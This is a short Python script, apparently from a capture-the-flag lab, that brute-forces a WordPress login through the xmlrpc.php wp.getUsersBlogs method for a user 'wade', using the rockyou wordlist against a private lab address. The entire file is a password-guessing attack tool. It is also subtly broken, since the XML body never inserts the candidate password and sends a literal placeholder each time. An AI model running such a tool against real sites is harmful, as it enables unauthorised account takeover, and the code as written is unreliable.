#!/usr/bin/python3

import requests

url = 'http://10.10.248.22/retro/xmlrpc.php'

with open('/usr/share/wordlists/rockyou.txt') as handler:
	passwords = handler.read().split('\n')

idx = passwords.index('orange')
passwords = passwords[idx:]
passwords.insert(0, 'parzival')
for p in passwords:
	data = """
	<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
	<param><value>wade</value></param>
	<param><value>{}</value></param>
	</params>
	</methodCall>
	"""

	resp = requests.post(url, data=data)
	if not "Incorrect username or password." in resp.text:
		print(resp.text)
		break
	else:
		print("Trying with user:wade and password:{}".format(p))